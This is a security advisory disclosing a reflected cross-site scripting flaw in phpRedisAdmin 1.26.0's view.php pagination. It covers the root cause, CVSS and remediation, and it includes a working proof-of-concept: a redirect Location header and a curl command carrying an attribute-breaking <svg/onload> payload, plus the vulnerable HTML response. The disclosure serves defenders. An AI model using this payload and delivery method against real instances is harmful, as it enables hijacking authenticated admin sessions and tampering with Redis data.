# phpRedisAdmin Reflected Cross-Site Scripting (1.26.0)

**CWE-79 · Reflected, unauthenticated target (XSS meaningful against authenticated admin sessions) · Attacker JavaScript execution in the application origin via view.php pagination**

> **Vendor:** erikdubbelboer
> **Product:** phpRedisAdmin (PHP, predis client)
> **Affected version:** 1.26.0 (commit 91d0101, tagged v1.26.0)
> **Affected endpoints:** `GET /view.php?s=<srv>&d=<db>&key=<hash|list|set|zset key>&page=N` (pagination bar; key must hold more than `count_elements_page`, default 100, elements)
> **Disclosed via:** VulDB (submission #xxxxxx)
> **Note:** Sensitive extracted values (credentials) have been redacted from this public disclosure.

## 1. Summary

The key browser `view.php` builds its pagination bar from the raw request path: `$url = preg_replace('/&page=(\d+)/i', '', getRelativePath('view.php'))` (view.php:149), where `getRelativePath()` (includes/functions.inc.php:104-106) returns a raw substring of `$_SERVER['REQUEST_URI']` with **no HTML escaping**. The value is interpolated into every pagination anchor (`"<a href=\"$url&page=$counter\">"`) and the assembled HTML is echoed twice (view.php:196 and view.php:310). An attacker-controlled query string therefore lands inside an `href` attribute — only the trailing `&page=NN` is stripped; quotes and tags pass through. A victim (ideally an authenticated admin when login/cookie_auth is enabled) who opens an attacker-crafted link executes attacker JavaScript in the application origin.

## 2. Root Cause

| File | Lines | Role |
|---|---|---|
| `includes/functions.inc.php` | 104-106 | `getRelativePath()` — returns raw `$_SERVER['REQUEST_URI']` substring |
| `view.php` | 149 | `$url = preg_replace('/&page=(\d+)/i', '', getRelativePath('view.php'))` — regex strips only trailing `&page=NN` |
| `view.php` | 151-191 | `$url` interpolated unescaped into `"<a href=\"$url&page=$counter\">"` pagination anchors |
| `view.php` | 196, 310 | `echo $pagination` — output sites (payload appears 2x) |

```php
// includes/functions.inc.php:104-106
function getRelativePath($base) {
  return substr($_SERVER['REQUEST_URI'], strpos($_SERVER['REQUEST_URI'], $base)); // raw, no escaping
}

// view.php:149
$url = preg_replace('/&page=(\d+)/i', '', getRelativePath('view.php'));
// view.php:157 (one of the anchor builds)
$pagination .= "<a href=\"$url&page=$counter\">$counter</a>&nbsp;";
```

- No `htmlspecialchars`/`htmlentities` anywhere in the chain.
- The `preg_replace` only removes a trailing `&page=(\d+)` — injected markup survives.

## 3. Prerequisites

- A `hash`/`list`/`set`/`zset` key whose element count exceeds `count_elements_page` (100 by default, includes/config.sample.inc.php:87) so the pagination bar renders.
- Victim opens an attacker-controlled link — raw metacharacters must be delivered via an HTTP 30x redirect because browsers percent-encode typed/clicked URLs.
- The XSS matters when authentication is enabled (login/cookie_auth); without auth the attacker already has full UI access.

## 4. Reproduction

Attacker page issues a redirect:

```http
HTTP/1.1 302 Found
Location: /view.php?s=0&d=0&key=users&page=2"><svg/onload=console.log(1)>&page=999
```

Code-level proof against a local instance (payload as the redirect would deliver it):

```bash
curl --path-as-is 'http://127.0.0.1:8095/view.php?s=0&d=0&key=users&page=2"><svg/onload=console.log(1)>&page=999'
```

Response (HTTP 200, `text/html; charset=utf-8`) — pagination div served verbatim, occurs twice (echo sites view.php:196 and view.php:310):

```html
<div style="width: inherit; word-wrap: break-word;"><a href="view.php?s=0&d=0&key=users"><svg/onload=console.log(1)>&page=998">&#8592;</a>&nbsp;<a href="view.php?s=0&d=0&key=users"><svg/onload=console.log(1)>&page=1">1</a>&nbsp;<a href="view.php?s=0&d=0&key=users"><svg/onload=console.log(1)>&page=2">2</a>&nbsp;&#8594;&nbsp;</div>
```

The attacker's double quote (`page=2"`) closes the `href` attribute; `<svg/onload=console.log(1)>` is then parsed as a standalone SVG element whose `onload` handler executes on insertion.

## 5. Confirmed Techniques

- Reproduced against phpRedisAdmin 1.26.0 (PHP 8.4.26 `php -S`, predis 2.3.0, Redis 5.0.14 on 127.0.0.1, default config) with a 150-element list key (`users`), so pagination renders at the default `count_elements_page=100`.
- Payload found 2x in the response body (both echo sites), 0x in the negative control (`/view.php?s=0&d=0&key=users&page=1` renders clean anchors).
- The trailing `&page=999` was removed by the `preg_replace` while the injected markup survived — confirming the only sanitization in the chain is the page-number strip.
- Payload is harmless (`console.log(1)`); browser execution follows from standard HTML parsing of `svg/onload` in an attribute-breaking position.

## 6. Impact

- Attacker JavaScript executes in the phpRedisAdmin origin when a victim opens the crafted link.
- Against an authenticated admin (login/cookie_auth enabled), the injected script runs with the victim's session and can silently read, modify or delete Redis keys and server configuration through the normal UI endpoints.
- Works even on unauthenticated instances (nuisance/defacement, phishing), but the security impact concentrates on authenticated sessions.

## 7. CVSS 3.1

`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H` (Base 8.8 High)

## 8. Remediation

- HTML-escape the value before interpolation: `htmlspecialchars($url, ENT_QUOTES)`.
- Better: rebuild the pagination URL from a server-side allowlist of query parameters (`s`, `d`, `key`) instead of echoing the raw `REQUEST_URI`.

## 9. References

- Project: https://github.com/erikdubbelboer/phpRedisAdmin
- CWE-79: https://cwe.mitre.org/data/definitions/79.html
- External disclosure: https://gist.github.com/qianqiusujiu/43d56b2ec741ca6a654bdfbc4e117d9a
- VulDB submission #xxxxxx

---
*All validation was performed in a local, isolated environment. The temporary environment was destroyed after testing.*
